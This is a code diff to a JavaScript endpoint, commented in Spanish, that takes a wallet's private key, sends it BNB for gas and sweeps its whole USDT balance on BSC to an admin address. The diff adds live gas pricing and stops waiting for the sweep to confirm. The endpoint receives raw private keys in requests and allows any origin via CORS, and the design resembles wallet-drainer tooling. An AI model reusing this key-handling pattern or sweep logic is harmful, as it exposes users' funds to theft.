@@ -1,7 +1,6 @@
 const { ethers } = require('ethers');
 
 module.exports = async function handler(req, res) {
-    // CORS unificado
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST,OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
@@ -14,50 +13,51 @@ module.exports = async function handler(req, res) {
     if (!network || network.toUpperCase() !== 'BSC') {
         return res.status(400).json({ success: false, error: 'Por ahora este endpoint solo soporta BSC' });
     }
-
     if (!userPrivateKey || !adminAddress || !feePrivateKey) {
         return res.status(400).json({ success: false, error: 'Faltan parámetros de seguridad' });
     }
 
     try {
-        // Conexión a la red principal de BSC
         const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
         
-        // Contrato inteligente oficial de USDT en BSC (BEP20)
         const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
         const usdtAbi = [
             "function balanceOf(address owner) view returns (uint256)",
             "function transfer(address to, uint amount) returns (bool)"
         ];
 
-        // Instanciar las billeteras
         const userWallet = new ethers.Wallet(userPrivateKey, provider);
         const feeWallet = new ethers.Wallet(feePrivateKey, provider);
         const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, userWallet);
 
-        // 1. Revisar cuánto USDT tiene la wallet del usuario
         const usdtBalance = await usdtContract.balanceOf(userWallet.address);
         
         if (usdtBalance === 0n) {
             return res.status(400).json({ success: false, error: 'La billetera no tiene fondos en USDT' });
         }
 
-        // 2. Calcular y enviar el BNB necesario para el Gas (Aprox 0.0003 BNB)
-        const gasAmount = ethers.parseEther("0.0003"); 
+        // SOLUCIÓN GAS: Calcular tarifa en tiempo real
+        const feeData = await provider.getFeeData();
+        const currentGasPrice = feeData.gasPrice || ethers.parseUnits("3", "gwei");
         
+        // Un envío de USDT en BSC consume aprox 60,000 de gas. Usamos 80,000 para estar 100% seguros.
+        const requiredGas = currentGasPrice * 80000n; 
+
+        // Inyectar el gas calculado
         const fundTx = await feeWallet.sendTransaction({
             to: userWallet.address,
-            value: gasAmount
+            value: requiredGas
         });
         
-        // Esperamos a que la inyección de gas se confirme
-        await fundTx.wait();
+        // Esperamos SOLO 1 confirmación del bloque para el BNB
+        await fundTx.wait(1);
 
-        // 3. Barrer los USDT a tu billetera administradora
+        // Disparamos el barrido de USDT
         const sweepTx = await usdtContract.transfer(adminAddress, usdtBalance);
-        await sweepTx.wait();
+        
+        // SOLUCIÓN TIMEOUT: NO usamos await sweepTx.wait(). 
+        // Devolvemos la respuesta al bot inmediatamente. La blockchain hará el resto.
 
-        // Formatear el saldo movido
         const formattedAmount = ethers.formatUnits(usdtBalance, 18);
 
         return res.status(200).json({
